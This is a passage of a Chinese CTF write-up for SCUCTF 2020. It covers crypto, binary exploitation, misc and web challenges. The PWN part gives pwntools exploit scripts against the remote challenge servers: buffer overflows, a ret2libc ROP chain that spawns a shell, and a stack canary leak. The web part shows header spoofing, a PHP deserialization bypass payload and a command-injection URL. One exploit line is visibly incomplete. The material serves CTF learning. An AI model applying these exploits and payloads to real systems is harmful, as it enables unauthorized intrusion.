title="8.baby_pad"></a>8.baby_pad</h3><p>观察pad方法和输出的密文,在pad函数在M后面加上了0x05个0x05,故先将cipher从十六进制字符串转转成字符串,然后使用切片切掉后5个字符得到M,再将M与key进行异或得到flag,编写脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>flag = <span class="hljs-string">b&#x27;???&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span>(<span class="hljs-params">M</span>):</span><br>    pad_length = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(M) % <span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> M.decode() + <span class="hljs-built_in">chr</span>(pad_length) * pad_length<br><br>key = <span class="hljs-string">b&#x27;x&#x27;</span> * <span class="hljs-built_in">len</span>(flag)<br>print(<span class="hljs-built_in">len</span>(flag))<br>cipher = pad(strxor(flag, key))<br>print(cipher.encode().<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># cipher = 0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505</span><br><br>res = <span class="hljs-string">&#x27;0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505&#x27;</span><br>s = <span class="hljs-built_in">bytes</span>.fromhex(res).decode()<br>print(<span class="hljs-built_in">len</span>(s))<br>t = s[:-<span class="hljs-number">5</span>].encode()<br>key1 = <span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-built_in">len</span>(t)<br>print(strxor(t,key1))<br><span class="hljs-comment"># b&#x27;scuctf&#123;easy_trickkkk&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-nc"><a href="#1-nc" class="headerlink" title="1.nc"></a>1.nc</h3><p>在linux终端 nc 121.196.34.30 10004</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/nc.png"></p><hr><h3 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2.ret2text"></a>2.ret2text</h3><p>查看关键函数,可见s申请的空间为0x10:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.2.png"></p><p>gdb调试查看偏移量,所以偏移量就是0x10:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.4.png"></p><p>找到后门函数success的地址:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.3.png"></p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./ret2text&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.196.34.30&#x27;</span>,<span class="hljs-string">&#x27;10007&#x27;</span>)<br>back_door = <span class="hljs-number">0x04007A5</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="raw"><a href="#raw" class="headerlink" title="raw"></a>raw</h2><h3 id="3-ret2libc"><a href="#3-ret2libc" class="headerlink" title="3.ret2libc"></a>3.ret2libc</h3><p>先查看保护情况:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.1.png"></p><p>查看偏移量,故偏移量为buf申请的空间加上rbp的8个字节:0x70+0x08=120</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.2.png"></p><p>因为是64位的程序,使用寄存器传递参数,通过pop指令来向寄存器中传值,查找rdi的地址</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.3.png"></p><p>查看bin/sh的地址</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.4.png"></p><p>查看system函数的地址</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.5.png"></p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>sh = remote(<span class="hljs-string">&#x27;121.196.34.30&#x27;</span>,<span class="hljs-string">&#x27;10005&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">sh, payload</span>):</span><br>sh.send(payload)<br>sh.interactive()<br>    <br>system_addr = <span class="hljs-number">0x04006D0</span><br>pop_rdi_addr = <span class="hljs-number">0x04009f3</span><br>binsh_addr = <span class="hljs-number">0x0400A14</span> <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>* <span class="hljs-number">120</span> + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)<br>pwn(sh, payload) <br></code></pre></div></td></tr></table></figure><hr><h3 id="5-baby-canary"><a href="#5-baby-canary" class="headerlink" title="5.baby_canary"></a>5.baby_canary</h3><p>查看保护情况</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.1.png"></p><p>可以知道v6就是canary,计算buf到v6的偏移量为0x28-0x18=24,还要覆盖rbp的0x08个字节</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.2.png"></p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>path = <span class="hljs-string">&quot;/home/icey/canarys/canary&quot;</span><br><br>io = remote(<span class="hljs-string">&#x27;121.196.34.30&#x27;</span>,<span class="hljs-string">&#x27;10000&#x27;</span>)<br>get_shell = ELF(path).sym[<span class="hljs-string">&quot;success&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;length?\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;32&quot;</span>) <span class="hljs-comment"># 发送32(大于24小于32)通过验证,并可以使返回数据时不发生EOF异常</span><br>io.recvuntil(<span class="hljs-string">&quot;what?\n&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span><br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span>)<br><br>Canary = u64(io.recv(<span class="hljs-number">8</span>)) -<span class="hljs-number">0xa</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(get_shell)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-easy-encode"><a href="#1-easy-encode" class="headerlink" title="1.easy_encode"></a>1.easy_encode</h3><p>仅有scu、401两种组成编码,猜测是摩斯密码 写程序输出摩斯密码格式:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>): <br>s = f.readline() <br>s = s.replace(<span class="hljs-string">&#x27;401&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-comment"># long </span><br>s = s.replace(<span class="hljs-string">&#x27;SCU&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>) <span class="hljs-comment"># short </span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) <br>s = s.replace(<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br><span class="hljs-built_in">print</span> s[:-<span class="hljs-number">1</span>]<br></code></pre></div></td></tr></table></figure><p>在线网站解密得到flag</p><hr><h3 id="2-excalibur"><a href="#2-excalibur" class="headerlink" title="2.excalibur"></a>2.excalibur</h3><p>java反编译,得到flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/misc/misc2.png"></p><hr><h3 id="3-签到题"><a href="#3-签到题" class="headerlink" title="3.签到题"></a>3.签到题</h3><hr><h3 id="4-问卷"><a href="#4-问卷" class="headerlink" title="4.问卷"></a>4.问卷</h3><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><hr><h3 id="1-真的是签到题"><a href="#1-真的是签到题" class="headerlink" title="1.真的是签到题"></a>1.真的是签到题</h3><p>保存图片就有flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/%E4%B8%8B%E8%BD%BD.png"></p><hr><h3 id="2-情感日记"><a href="#2-情感日记" class="headerlink" title="2.情感日记"></a>2.情感日记</h3><p>一张张看,拼出flag</p><hr><h3 id="3-新生系列1-easyhtml"><a href="#3-新生系列1-easyhtml" class="headerlink" title="3.(新生系列1)easyhtml"></a>3.(新生系列1)easyhtml</h3><p>F12查看源代码,注释处就有flag</p><hr><h3 id="4-我爬我爬"><a href="#4-我爬我爬" class="headerlink" title="4.我爬我爬"></a>4.我爬我爬</h3><p>地址栏输入robots.txt跳转<br>发现ffflllaaaggg.html,输入后再跳转,base64解密得到flag</p><hr><h3 id="5-easyheehee"><a href="#5-easyheehee" class="headerlink" title="5.easyheehee"></a>5.easyheehee</h3><p>查看响应头,lookme=Wm1abWJHeHNZV0ZoWjJkbkxuQm9jQT09<br>两次base64解码得到ffflllggg.php,在地址栏访问即可获得flag</p><hr><h3 id="6-easyweb"><a href="#6-easyweb" class="headerlink" title="6.easyweb"></a>6.easyweb</h3><p>Burp抓包添加:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">121.89.162.165:8006</span><br><span class="hljs-attribute">User</span>-Agent: <span class="hljs-number">0</span>x<span class="hljs-number">401</span>Browser<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Cookie</span>: Hm_lvt_a<span class="hljs-number">7727</span>c<span class="hljs-number">1058</span>f<span class="hljs-number">4</span>f<span class="hljs-number">3</span>bf<span class="hljs-number">30026</span>a<span class="hljs-number">96</span>a<span class="hljs-number">53</span>ff<span class="hljs-number">1</span>e<span class="hljs-number">9</span>=<span class="hljs-number">1605940928</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">referer</span>: http://scuctf.com<br><span class="hljs-attribute">Via</span>: hgg.com<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>得到</p><figure class="highlight autohotkey"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autohotkey">scuctf&#123;i_am_<span class="hljs-built_in">a_powerful</span>_hacker&#125;<br></code></pre></div></td></tr></table></figure><hr><h3 id="7-看我后面"><a href="#7-看我后面" class="headerlink" title="7.看我后面"></a>7.看我后面</h3><p>后续加index.php.bak得到源码,弱比较,传入5201314得到flag</p><hr><h3 id="8-normalPHP"><a href="#8-normalPHP" class="headerlink" title="8.normalPHP"></a>8.normalPHP</h3><p>读Php代码<br>经测试,base64被过滤,用base32<br><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/123.png"></p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf">得到<span class="hljs-built_in">flag</span>$<span class="hljs-built_in">flag</span> = <span class="hljs-string">&quot;scuctf&#123;php_is_very_1111asy&#125;&quot;</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="9-渣男记录"><a href="#9-渣男记录" class="headerlink" title="9.渣男记录"></a>9.渣男记录</h3><p>查找文件备份<a href="http://www.zip得到源码,select做参数,反序列化/">www.zip得到源码,select做参数,反序列化</a><br>wakeup修改username  手动设置参数大于实际参数就可以绕过wakeup<br>select=O:4:”Love”:3:{s:8:”username”;s:5:”admin”;s:8:”password”;i:520;</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>&#123;sadsa<span class="hljs-number">541</span>-azhanana-<span class="hljs-number">2</span>xzsdz&#125;<br></code></pre></div></td></tr></table></figure><p><a href="http://121.89.162.165:8987/?select=O:4:%22Love%22:3:%7Bs:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:3:%22520%22;%7D">http://121.89.162.165:8987/?select=O:4:%22Love%22:3:{s:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:3:%22520%22;}</a></p><hr><h3 id="10-有手就行"><a href="#10-有手就行" class="headerlink" title="10.有手就行"></a>10.有手就行</h3><p><a href="http://47.94.226.249:8888/?ctf=sh%20/flag%202%3E&1">http://47.94.226.249:8888/?ctf=sh%20/flag%202%3E%261</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SCU</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
